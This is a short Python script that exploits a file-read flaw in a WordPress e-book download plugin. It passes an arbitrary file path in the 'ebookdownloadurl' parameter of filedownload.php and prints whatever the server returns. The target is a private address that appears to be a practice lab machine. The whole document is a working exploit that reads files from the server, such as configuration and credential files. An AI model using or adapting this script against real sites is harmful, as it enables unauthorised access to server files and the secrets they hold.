#!/usr/bin/python3

import requests
import sys

url_site = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php"
filename = sys.argv[1]

data_get = {"ebookdownloadurl": filename}
r = requests.get(url_site, params=data_get)

if b'\x00' in r.content:
    file_system_content = str(r.content).replace(filename,'').replace('<script>window.close()</script>','').replace('\\x00','\n').replace("b'",'')[:-1]
    print("\n" + file_system_content)
else:
    file_system_content = r.text.replace(filename,'').replace('<script>window.close()</script>','')
    if len(file_system_content) > 0:
        print("\n" + file_system_content)
